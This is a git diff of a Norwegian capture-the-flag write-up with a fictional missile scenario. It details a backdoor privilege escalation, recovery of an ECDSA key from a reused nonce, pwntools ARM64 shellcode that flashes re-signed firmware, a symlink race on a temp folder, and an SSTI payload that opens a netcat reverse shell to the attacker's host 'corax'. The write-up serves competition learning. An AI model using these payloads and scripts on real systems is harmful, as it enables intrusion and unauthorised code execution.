@@ -443,6 +443,7 @@ I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis ti
 
 ```java
 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+
     id = ois.readUTF();
     sleepDuration = ois.readInt();
     serverURL = ois.readUTF();
@@ -459,7 +460,7 @@ private void readObject(ObjectInputStream ois) throws IOException, ClassNotFound
 }
 ```
 
-Klienten mottar kommandoer gjennom `checkInWithC2()` funksjonen til `Client.java`, mer spesifikt disse to linjene:
+Klienten mottar kommandoer gjennom `checkInWithC2()` funksjonen i `Client.java`, mer spesifikt disse to linjene:
 
 ```java
 ObjectInputStream in = new ObjectInputStream(conn.getInputStream());
@@ -513,6 +514,12 @@ nc -lvnp 4444 &
 scp -i 2_oppdrag/sshkey_c2@shady-aggregator malicious_config c2@shady-aggregator:
 ssh -i 2_oppdrag/sshkey_c2@shady-aggregator c2@shady-aggregator
 cd app
+ls -l
+# drwxr-xr-x 2 c2 c2    69 Jan 11 14:51 __pycache__
+# -rw-r--r-- 1 c2 c2 73728 Jan 11 15:53 db.sqlite3
+# -rw-r--r-- 1 c2 c2    64 Dec  2 14:47 gunicorn.conf.py
+# -rwxr-xr-x 1 c2 c2  8594 Dec 20 14:55 main.py
+# drwxr-xr-x 1 c2 c2    81 Nov 30 13:23 templates
 python3 add_command_to_db.py DEADBEEFDEADBEEF 1 ../malicious_config
 exit
 fg
@@ -603,7 +610,7 @@ En naturlig ting å gjøre i et nytt miljø er å sjekke hva som er blitt gjort 
 
 Når vi kjører `konekt` blir vi møtt av følgende meny.
 
-```
+```text
 ╒══════════════════════════════════════════════════════════════════════════════╕
 │                                                                         MAIN │
 ╞══════════════════════════════════════════════════════════════════════════════╡
@@ -616,7 +623,7 @@ Når vi kjører `konekt` blir vi møtt av følgende meny.
 
 Om vi velger `missile` -> `list submarines with missiles` får vi følgende liste:
 
-```
+```text
 ╒══════════════════════════════════════════════════════════════════════════════╕
 │                                                list submarines with missiles │
 ╞══════════════════════════════════════════════════════════════════════════════╡
@@ -743,7 +750,8 @@ Jeg reverse engineeret `/usr/bin/konekt`, og fant ut at den fungerte som en wrap
 └──────────────────────────────────────────────────────────────────────────────┘
 ```
 
-
+Om vi laster ned og pakker ut `server-software.tar.xz`, så får vi ei binærfil som heter `fracture`. 
+Dette er programvaren som kjører på `mad`. Planen er å reversere denne, og finne en måte å elevere privilegiet vårt. Jeg brukte Ghidra til dette.
 
 I funksjonen `ui_read_key()` finner vi følgende:
 
@@ -758,18 +766,61 @@ if (input == 1) {
 
 Den leser en enkelt byte med data fra `read()`, og lagrer den i en buffer kalt `read_buf`. 
 Deretter utfører den en bitvis venstre skyving på `_history.0` før den ORer den med `read_buf`. Resultatet blir lagret tilbake i `_history.0`.
-Lettere sagt: de siste 8 bokstavene vi har skrevet inn er lagret i `_history.0`.
+Lettere sagt: de siste 8 karakterene vi har skrevet inn er lagret i `_history.0`.
 
 `0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
 Når `_history.0` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.
 
 Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss noe som ikke er alfanumerisk. Jeg brukte "!".
 
-Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp dette flotte bildet:
+Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp et flott bilde:
+
+```sh
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                         MAIN │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ p: program                                                                   │
+│ m: missile                                                                   │
+│ f: firmware                                                                  │
+│ u: user                                                                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                     PROGRAMS │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ l: list programs                                                             │
+│ s: show program                                                              │
+│ r: run program                                                               │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                list programs │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ filename                                                            |   size │
+│ --------------------------------------------------------------------+------- │
+│ findflag.prg                                                        |    254 │
+│ telemetry.prg                                                       |    212 │
+│ uid.prg                                                             |    148 │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                     PROGRAMS │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ l: list programs                                                             │
+│ s: show program                                                              │
+│ r: run program                                                               │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                  run program │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ program name > findflag.prg                                                  │
+```
 
 ![2.13_flag](images/2.13_flag.png)
 
-```
+```text
 Kategori: 2. Oppdrag
 Oppgave:  2.13_findflag
 Svar:     bc05429e668f76f0cb22b53ca900e447
@@ -799,7 +850,7 @@ Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
 
 `signer` blir brukt for å signere to filer, `test.txt` og `missile.1.3.37.fw`. Dette gjøres med en private key, `privkey.pem`, som blir slettet etter bruk.
 
-Hjelp-menyen nevner ECDSA, og hinter til at secp256k1-kurven blir benyttet:
+Hjelp-menyen til `signer` nevner ECDSA, og hinter til at secp256k1-kurven blir benyttet:
 
 ```bash
 signer --help
@@ -862,7 +913,7 @@ tail -c 64 missile.1.3.37.fw | hd
 
 Herlig! `r`-verdiene er identiske.
 
-Brukte Python for å ekstrahere privatnøkkelen. 
+Brukte Python for å kalkulere privatnøkkelen. 
 Skriptet ligger [her](crypto/same_k_recover_privkey.py). Matten er basert på [denne siden](https://asecuritysite.com/ecdsa/ecd5):
 
 ```C
@@ -892,9 +943,210 @@ Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin.
 
 ## 2.15_firmware_staged
 
-Jeg lagde [et par skript](konekt_scripts/) for å interagere med `mad:1337` via Python sockets. Dette tok tiden for å laste opp/ned filer fra flere minutter ned til noen sekunder. Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte med pwntools til aurum. Dette gjorde feilsøkingen av shellcoden mye raskere.
+Jeg lagde [4 skript](konekt_scripts/) for å interagere med `mad:1337` via Python sockets. Dette tok tiden for å laste opp/ned filer fra flere minutter ned til noen sekunder. 
+Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte på min lokale maskin til aurum. Dette gjorde feilsøkingen/krasjingen av shellcoden mye raskere.
 
+I kildekoden til `fracture` finner vi denne interessante funksjonen:
 
+```c
+int kontrolr_command(char *param_1) {
+
+    int iVar1;
+    int iVar2;
+    size_t __n;
+    size_t sVar3;
+    addrinfo *paVar4;
+    addrinfo *local_38;
+    addrinfo local_30;
+  
+    local_30._0_8_ = 0;
+    local_30._8_8_ = 1;
+    local_30._16_8_ = 0;
+    local_30.ai_addr = 0x0;
+    local_30.ai_canonname = 0x0;
+    local_30.ai_next = 0x0;
+    iVar1 = getaddrinfo("127.0.0.1","1025",&local_30,&local_38);
+    if (-1 < iVar1) {
+    iVar1 = -1;
+    for (paVar4 = local_38; paVar4 != 0x0; paVar4 = paVar4->ai_next) {
+        iVar1 = socket(paVar4->ai_family,paVar4->ai_socktype,paVar4->ai_protocol);
+        if (-1 < iVar1) {
+        iVar2 = connect(iVar1,paVar4->ai_addr,paVar4->ai_addrlen);
+        if (iVar2 == 0) break;
+        close(iVar1);
+        }
+    }
+    freeaddrinfo(local_38);
+    if (iVar1 != -1) {
+        __n = strlen(param_1);
+        sVar3 = write(iVar1,param_1,__n);
+        if (__n == sVar3) {
+        return iVar1;
+        }
+        close(iVar1);
+    }
+    }
+    return -1;
+}
+```
+
+Den sender en kommando (`param_1`) til en tjeneste som lytter på `localhost:1025` og leser tilbake svaret.
+Siden vi kan kjøre hvilken som helst kode i konteksten av `fracture` så kan jo vi gjøre akkurat det samme, bare bedre.
+
+Ett problem er at den forventer `ARM64` instruksjonssettet, kontra `x86_64` som vi vanlige dødlige er vant med. Jeg har aldri rørt ARM64 før. Den eneste erfaringen jeg har med det er via en kompis som måtte jobbe med det, og han nevnte at han "*savnet vanlig assembly*".
+
+Heldigvis er årstallet 2022/23. Smarte individer har gjort mye bra arbeid. Spesielt de som har laget `shellcraft`-modulen til `pwntools`.
+
+Med `shellcraft` er det å lage shellcode nesten like enkelt som å skrive C-kode. Vi ønsker da å sende en tilfeldig kommando til `localhost:1025`, og se hva vi får tilbake:
+
+```python
+from pwn import *
+
+context.binary = ELF("/home/kali/cybertalent/fracture", checksec=False)
+command = b"give_flag_pls"
+
+shellcode = shellcraft.connect("127.0.0.1", 1025)
+shellcode += shellcraft.write("x12", command, len(command))
+shellcode += shellcraft.read("x12", "sp", 0x100)
+shellcode += shellcraft.mov("x11", "x0")
+shellcode += shellcraft.close("x12")
+shellcode += shellcraft.write(0x4, "sp", "x11")
+shellcode += shellcraft.exit(69)
+
+compiled_shellcode = asm(shellcode)
+print("Length of shellcode:", len(compiled_shellcode))
+print(enhex(compiled_shellcode))
+```
+
+```bash
+python3 /home/kali/cybertalent/generate_arm_shellcode.py
+# Length of shellcode: 184
+# 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ee2c8dd2ceaeacf2eecbccf28e2decf2efec8bd20f8eadf26f0ec0f2ee3fbfa9e1030091e0030caaa20180d2080880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4200080d2a80b80d2010000d4
+python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ee2c8dd2ceaeacf2eecbccf28e2decf2efec8bd20f8eadf26f0ec0f2ee3fbfa9e1030091e0030caaa20180d2080880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080d4200080d2a80b80d2010000d4
+# ping    is service listening?
+#         arguments: None
+#         response: 'pong'
+# list    list submarines and missiles
+#         arguments: None
+#         response: text
+# tele    show telemetry when missiles are in flight
+#         arguments: None
+#         response: text
+# flsh    stage missile firmware to be flashed
+#         arguments: ['u16le:submarine', 'u16le:missile', 'binary:firmware']
+#         response: text
+```
+
+I kildekoden til `fracture` ser vi tilfeller hvor `list` og `tele` blir brukt. 
+`ping` er akkurat like simpel som den virker, så vi står igjen med `flsh`.
+
+Vi har et valg om å oppdatere firmwaren til missilene gjennom `konekt`, men dette feiler da den ikke finner `flash.prg`:
+
+```text
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                         MAIN │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ p: program                                                                   │
+│ m: missile                                                                   │
+│ f: firmware                                                                  │
+│ u: user                                                                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                     MISSILES │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ l: list submarines with missiles                                             │
+│ s: simulate all missile flights                                              │
+│ f: upgrade missile firmware                                                  │
+└──────────────────────────────────────────────────────────────────────────────┘
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                     upgrade missile firmware │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│                                                                   [AD----SO] │
+│ firmware file name > missile.1.3.37.fw                                       │
+│ submarine > 1                                                                │
+│ missile > 1                                                                  │
+│ flash.prg failed with errno:2 (No such file or directory)                    │
+└──────────────────────────────────────────────────────────────────────────────┘
+```
+
+Jeg brukte følgende shellcode for å leter etter `flash.prg`, i tilfelle den fantes et annet sted i filstrukturen som vi kunne aksessere:
+
+```python
+from pwn import *
+
+context.binary = ELF("/home/kali/cybertalent/fracture")
+
+shellcode =  shellcraft.open("..") # Endre denne til mappen du vil sjekke
+shellcode += shellcraft.getdents64("x0", "sp", 0x321)
+shellcode += shellcraft.write(0x4, "sp", 0x321)
+shellcode += shellcraft.exit(69)
+
+print(enhex(asm(shellcode)))
+```
+
+Jeg fant ingenting. Vi er dessverre sperret inne i et fengsel gjennom `chroot`, og har tilgang til veldig lite.
+
+Det neste logiske steget er da å lage en "*egen*" versjon av `flash.prg`.
+Basert på hvordan `flsh` ønsket argumentene kom jeg frem til dette:
+
+```python
+from pwn import *
+
+context.binary = ELF("/home/kali/cybertalent/fracture")
+
+command = b"flsh"
+submarine = p16(0)
+missile = p16(0)
+full_command = command + submarine + missile
+firmware = "/firmware/missile.1.3.37.fw"
+
+shellcode = shellcraft.connect("127.0.0.1", 1025)
+shellcode += shellcraft.write("x12", full_command, len(full_command))
+shellcode += shellcraft.cat(firmware, "x12")
+shellcode += shellcraft.read("x12", "sp", 0x100)
+shellcode += shellcraft.mov("x11", "x0")
+shellcode += shellcraft.close("x12")
+shellcode += shellcraft.write(0x4, "sp", "x11")
+shellcode += shellcraft.exit(69)
+
+compiled_shellcode = asm(shellcode)
+print("Length of shellcode:", len(compiled_shellcode))
+print(enhex(compiled_shellcode))
+```
+
+Legg merke til at jeg ikke har skrevet et fnugg av ARM64 assembly. Det er jeg fornøyd med.
+
+```bash
+python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
+[+] FLASH 0:00 274c4
+[+] 7f454c46010101000000000000000000020028000100000025c3000034000000...
+```
+
+`7f454c46` er filsignaturen til en ELF-fil, så vi ser at firmwaren ble lastet opp. 
+Basert på erfaringen jeg har med pwn så er det mulig at vi leser tilbake for tidlig, før den har rukket å gjøre seg ferdig.
+Jeg la til en `nanosleep(sec=2)` etter `cat` og før `read`:
+
+```python
+<...>
+shellcode += shellcraft.pushstr("\x02".ljust(0x10, "\x00"), append_null=False)
+shellcode += shellcraft.nanosleep("sp")
+<...>
+```
+
+```bash
+python3 /home/kali/cybertalent/generate_arm_shellcode.py
+# Length of shellcode: 316
+# 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d44e0080d2ef031faaee3fbfa9e0030091e1031faaa80c80d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
+python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d44e0080d2ef031faaee3fbfa9e0030091e1031faaa80c80d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
+# [+] FLASH 0:00 274c4
+# [+] 7f454c46010101000000000000000000020028000100000025c3000034000000...
+# [+] Signature OK
+# [+] FLAG: 7f34ada436059e84fea23eb48c91024c9203638b
+```
+
+Hurra! Etter litt testing var en `nanesleep` på ett sekund for lite til å fullføre hver gang, men to sekunder var midt i blinken.
 
 ```text
 Kategori: 2. Oppdrag
@@ -912,7 +1164,7 @@ Siden alle missilene i hver ubåt skal til samme mål, må firmware være identi
 
 Her ble det litt vanskelig.
 
-Jeg brukte Ghidra for å reverse-engineere, da IDA kun støtter ARM om man er søkkrik.
+Jeg brukte igjen Ghidra for å reverse-engineere, da IDA kun støtter ARM om man er søkkrik.
 
 I funksjonen `boot_banner()` kan vi se følgende:
 
@@ -926,7 +1178,7 @@ Jeg brukte en god stund på å navigere den dekompilerte koden, og stirret i tim
 
 I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
 Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12_missile_targets](#212_missile_targets).
-Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:
+`tof` er *Time of Flight*, altså flytiden. Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:
 
 ```C
 zsl_vec_from_arr(&target, _target, param_3, 0, param_1);
@@ -1017,12 +1269,12 @@ print("_target value:", struct.pack('d' * len(ecef_vectors), *ecef_vectors).hex(
 
 Output:
 
-```
+```text
 Target ECEF vectors: [4224766.3303444] [-3991030.54681077] [2610108.35568405]
 _target value: d55c2495bf1d50412de5fd45fb724ec10c0e872ddee94341
 ```
 
-Planen nå var å:
+Neste steg var å simulere missilet med den nye firmwaren:
 * Patche bytene i `_target` ved hjelp av "Bytes"-visningen til Ghidra
 * Lagre firmwaren og overføre den til `aurum`.
 * Signere filen ved å bruke `signer` og `privkey.pem`
@@ -1031,16 +1283,28 @@ Planen nå var å:
 * Utføre en simulering, og se hva som skjer
 
 ```bash
-
+scp missile.1.3.38.fw login@cybertalent.no
+ssh login@cybertalent.no
+scp -i 2_oppdrag/sshkey_aurum missile.1.3.38.fw user@aurum:
+ssh -i 2_oppdrag/sshkey_aurum user@aurum
+signer --file-name missile.1.3.38.fw --key-file privkey.pem --rng-source urandom
+python3 upload_file.py missile.1.3.38.fw
+python3 upload_and_run.py <enhexed shellcode fra generate_arm_flash_submarine.py>
+python3 init_simulation.py
 ```
 
-Missilet fløy i rett retning, men traff ikke målet. Jeg tenkte at dette var på grunn av at flytiden ikke stemte mtp. den lengre distansen missilet nå måtte fly.
+Outputtet fra simuleringen blir dessverre altfor verbost til å vises. 
+Missilet fløy i rett retning, men traff ikke målet. 
+Jeg tenkte at dette var på grunn av at flytiden ikke stemte mtp. den lengre distansen missilet nå måtte fly.
 
 Jeg endret da én byte i `_tof`, slik at tallverdien ble på ~69000. Dette gjorde at simuleringen brukte 10 timer, og missilet traff fortsatt ikke.
+Kan ikke anbefales.
 
-Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, istedenfor å kalkulere den. Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
+Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. 
+Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, istedenfor å kalkulere den. 
+Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
 
-Jeg lagde da et [lite skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:
+Jeg lagde et [skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:
 
 ```text
 Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
@@ -1140,12 +1404,28 @@ Submarine 5 - Distance: 3177066.054664542 - Recommended _tof: 2100.0 (0068a040)
 
 Hex-verdien i parantes er de rå bytene som `_tof` skal patches med.
 
-Jeg lagde da 5 firmwares, hvor alle hadde samme `_target`, men forskjellig `_tof`.
+Jeg lagde da 5 firmwares, hvor alle hadde samme `_target`, men forskjellig `_tof`. Deretter signerte jeg de, lastet de opp, flashet, og gjennomførte en simulering:
 
 ```bash
+scp missile.1.3.37.fw_sub* login@cybertalent.no
+ssh login@cybertalent.no
+scp -i 2_oppdrag/sshkey_aurum missile.1.3.37.fw_sub* user@aurum:
+ssh -i 2_oppdrag/sshkey_aurum user@aurum
+signer --file-name missile.1.3.37.fw_sub1 --key-file privkey.pem --rng-source urandom
+signer --file-name missile.1.3.37.fw_sub2 --key-file privkey.pem --rng-source urandom
+signer --file-name missile.1.3.37.fw_sub3 --key-file privkey.pem --rng-source urandom
+signer --file-name missile.1.3.37.fw_sub4 --key-file privkey.pem --rng-source urandom
+signer --file-name missile.1.3.37.fw_sub5 --key-file privkey.pem --rng-source urandom
+python3 upload_file.py missile.1.3.37.fw_sub1
+python3 upload_file.py missile.1.3.37.fw_sub2
+python3 upload_file.py missile.1.3.37.fw_sub3
+python3 upload_file.py missile.1.3.37.fw_sub4
+python3 upload_file.py missile.1.3.37.fw_sub5
+python3 upload_and_run.py <enhexed shellcode fra generate_arm_flash_all.py>
+python3 init_simulation.py
 ```
 
-Etter gode 2 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet, og 5 flagg dukket pent opp underveis.
+Etter gode 3 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet, og 5 flagg dukket pent opp underveis.
 
 ```text
 Kategori: 2. Oppdrag
@@ -1210,6 +1490,202 @@ Ny fil: /home/login/2_oppdrag/mission_complete.jpg
 ---
 
 ## 3.4.13_shady-aggregator_c2
+
+I funksjonen `add_command` i `main.py` finner vi 2 race conditions:
+
+```python
+@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
+def add_command(client_id):
+    upload_file = request.files.get("file", None)
+    if not upload_file:
+        logger.warning("missing file argument")
+        return Response("", 400)
+
+    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
+        command_file = f.name
+        upload_file.save(command_file)
+
+        try:
+            obj = Command(f)
+            obj.verify()
+            print(obj.__str__())
+            print(f"registering new command for client {client_id}")
+            add_command_to_db(client_id, obj.run_after, command_file)
+            return Response(f"OK\n", 200)
+
+        except:
+            print("invalid command or signature")
+            return Response("", 400)
+```
+
+Den første er `upload_file.save(command_file)`, som lagrer innholdet vi sender til serveren til et tilfeldig navn som den får fra `tempfile.NamedTemporaryFile`.
+
+Den andre er `add_command_to_db`, hvor den åpner filnavnet vi fikk fra `tempfile.NamedTemporaryFile`, leser innholdet, og skriver det inn i databasen. Dette skjer kun hvis filen som blir sendt består `obj.verify`-sjekken.
+
+Vi har da i teorien et utnyttelsesprimitiv for både lesing og skriving av filer.
+
+Merk også at `WORKSPACE` er satt til å være `/tmp/.../`, som er et filområde som vi har full tilgang til.
+
+Tanken var da å bruke Python til å konstant lese etter nye filer i `/tmp/.../`, og erstatte filen med en symbolisk kobling til en fil som vi bestemmer.
+
+På et moderne, vanlig system så vil denne typen utnyttelser gjennom symbolske linker i `world-writable directories` ikke fungere grunnet denne kjernebeskyttelsen: https://sysctl-explorer.net/fs/protected_symlinks/. 
+Denne beskyttelsen har stoppet meg flere ganger tidligere, men jeg er dum/dedikert nok til å bruke et flersifret antall timer på dette *just in case*.
+
+For å teste om vårt utnyttelsesprimitiv kan følge symbolske linker utenfor `/tmp`, så gjorde jeg et lite forsøk:
+
+Dette skriptet kjørte jeg lokalt på `shady-aggregator`:
+
+```python
+import os
+import time
+import sys
+
+# Før jeg kjørte dette skriptet gjorde jeg en `chmod 777 -R /home/archive` :)
+
+def main():
+
+    tmp_folder = "/tmp/.../"
+    target_file = "/home/archive/you_should_not_see_me.secret"
+    known_files = os.listdir(tmp_folder)
+
+    for _ in range(100):
+
+        tmp_file = tmp_folder + find_file(tmp_folder, known_files)
+        print("File found:", tmp_file)
+        file_race(tmp_file, target_file)
+        time.sleep(0.1)
+
+def find_file(tmp_folder, known_files):
+
+    while True:
+        for f in os.listdir(tmp_folder):
+            if f not in known_files:
+                return f
+
+
+def file_race(tmp_file, target_file):
+    
+    try:
+        os.unlink(tmp_file)
+        os.symlink(target_file, tmp_file)
+    except Exception as e:
+        print(e)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Dette kjørte jeg fra `corax`:
+
+```python
+import time
+import sys
+import requests
+
+url = "http://shady-aggregator.utl/f52e6101/"
+id = "DEADBEEFDEADBEEF" 
+file_contents = open("a.txt", "rb").read()
+file_form = {"file": open(sys.argv[1], "rb").read()}
+
+for _ in range(100):
+    requests.post(url + id + "/commands", files=file_form)
+    time.sleep(1)
+```
+
+Etter et par iterasjoner kan vi se at innholdet til `a.txt` dukker opp i `/home/archive/you_should_not_see_me.secret`. 
+Dette betyr enten at den beskyttelsen jeg nevnte er avskrudd, eller at noe annet rart har skjedd.
+Hvem vet, datamaskiner er rare.
+
+Dette var utnyttelsen av skrive-primitivet vårt. 
+Lese-primitivet er ganske likt, bortsett fra litt forskjellig timing i det lokale `race`-skriptet, og at `requester.py` i tillegg må lese tilbake innholdet som blir lagt inn i databasen og lese tilbake dette.
+
+For å teste hvor lang `sleep()` måtte være så satte jeg opp en egen versjon av serveren på en privat maskin hvor jeg hadde lagt til debug-output som viste hvor lang tid de forskjellige operasjonene brukte:
+
+```python
+@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
+def add_command(client_id):
+    start_time = time.time()
+    upload_file = request.files.get("file", None)
+    if not upload_file:
+        logger.warning("missing file argument")
+        return Response("", 400)
+
+    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
+        command_file = f.name
+        upload_file.save(command_file)
+        print(f"Time taken for file upload: {time.time() - start_time} seconds")
+
+        try:
+            obj = Command(f)
+            obj.verify()
+            print(f"Time taken for command verification: {time.time() - start_time} seconds")
+            print(obj.__str__())
+            print(f"registering new command for client {client_id}")
+            add_command_to_db(client_id, obj.run_after, command_file)
+            print(f"Time taken for database insertion: {time.time() - start_time} seconds")
+            return Response(f"OK\n", 200)
+
+        except:
+            print("invalid command or signature")
+            return Response("", 400)
+```
+
+Jeg endte da med fungerende lese-/skrive-primitiver, men hvordan kan vi bruke disse for å få tilgang til `c2` brukeren som kjører serveren?
+
+Jeg brukte mye tid på dette. Alt fra å prøve å skrive en `authorized_hosts` fil til `.ssh/` eller å erstatte `main.py` med en versjon som hadde en bakdør implementert.
+
+Dette funket da ikke siden `c2` brukeren ikke hadde en `.ssh/` mappe, og `main.py` lå i en mappe med et navn som jeg ikke visste om.
+
+Jeg fokuserte da på filene som lå i `template/`. Om vi kunne overskrive disse så ville vi muligens kunne utnytte *Server Side Template Injection* for å få et reverse shell.
+
+Mappen som `main.py` kjørte i kunne jeg aksessere gjennom `/proc/self/cwd/`. Gjennom denne kunne vi lett nå `/template`. "*Hvorfor brukte du ikke dette for å overskrive `main.py`?*" spør du kanskje. Jeg vet ikke. Jeg er uperfekt og glemmer ting.
+
+Uansett, jeg fulgte stegene i [denne](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) nettsiden for å få et reverse shell gjennom SSTI:
+
+```bash
+# På corax:
+echo -n "{{'foo'.__class__.__base__.__subclasses__()[275].__init__.__globals__['sys'].modules['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc corax 4444 >/tmp/f').read()}}" > admin.txt
+python3 requester_write.py admin.txt
+# På shady-aggregator:
+python3 race_write.py /proc/self/cwd/template/admin.txt
+# Vent i ~10 iterasjoner
+# På corax:
+nc -lvnp 4444 &
+curl http://shady-aggregator.utl/f52e6101/list
+fg
+whoami
+# c2
+ls -lR /home/c2
+# /home/c2:
+# total 4
+# -rw-r--r-- 1 root root 40 Jan 11 21:38 FLAGG.c17b05
+# drwxr-xr-x 1 c2   c2   43 Jan 12 00:28 app
+# 
+# /home/c2/app:
+# total 136
+# drwxr-xr-x 2 c2 c2     69 Jan 11 21:38 __pycache__
+# -rw-r--r-- 1 c2 c2 122880 Jan 12 00:28 db.sqlite3
+# -rw-r--r-- 1 c2 c2     64 Dec  2 14:47 gunicorn.conf.py
+# -rwxr-xr-x 1 c2 c2   8594 Dec 20 14:55 main.py
+# drwxr-xr-x 1 c2 c2     81 Nov 30 13:23 templates
+# 
+# /home/c2/app/__pycache__:
+# total 16
+# -rw-r--r-- 1 c2 c2  195 Jan 11 21:38 gunicorn.conf.cpython-39.pyc
+# -rw-r--r-- 1 c2 c2 9180 Jan 11 21:38 main.cpython-39.pyc
+# 
+# /home/c2/app/templates:
+# total 12
+# -rw-r--r-- 1 c2 c2   0 Nov 30 13:23 admin.html
